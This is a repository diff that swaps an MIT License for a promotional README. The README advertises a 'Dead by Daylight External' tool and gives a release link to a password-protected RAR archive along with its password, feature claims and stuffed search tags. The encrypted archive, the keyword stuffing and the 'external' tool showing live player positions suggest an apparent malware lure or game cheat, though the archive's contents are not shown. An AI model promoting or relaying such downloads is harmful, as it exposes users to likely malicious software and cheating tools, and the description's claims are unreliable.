@@ -1,21 +1,25 @@
-MIT License
+  ____  ____  ____     _______  _______ _____ ____  _   _    _    _     
+ |  _ \| __ )|  _ \   | ____\ \/ /_   _| ____|  _ \| \ | |  / \  | |    
+ | | | |  _ \| | | |  |  _|  \  /  | | |  _| | |_) |  \| | / _ \ | |    
+ | |_| | |_) | |_| |  | |___ /  \  | | | |___|  _ <| |\  |/ ___ \| |___ 
+ |____/|____/|____/   |_____/_/\_\ |_| |_____|_| \_\_| \_/_/   \_\_____|
+                                                                        
 
-Copyright (c) 2026 Downloadzyaswitch
+Dead by Daylight External is a lightweight utility for streamers and competitive players, providing real‑time match data, survivor/killer stats, and customizable overlays to enhance gameplay insight and audience engagement instantly.
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+##############################
+DOWNLOAD INFORMATION
+---------------------------
+DOWNLOAD LINK: https://github.com/Downloadzyaswitch/dbd-external-2026/releases/download/new/DBDExternal-4.5.1-x64.rar
+ARCHIVE PASSWORD: 5513
+##############################
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+Key Highlights
+- Live match feed with player positions, timers, and objective status.
+- Detailed survivor and killer statistics, including perk usage and survival rates.
+- Fully customizable UI overlays compatible with OBS, XSplit, and Streamlabs.
+- Auto‑update module ensures you always have the latest balance changes.
+- Low‑impact background operation, keeping your system performance optimal.
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+TAGS
+Dead by Daylight, external tool, real-time stats, streamer overlay, competitive gaming, utility, match tracker, DBDExt, OBS plugin
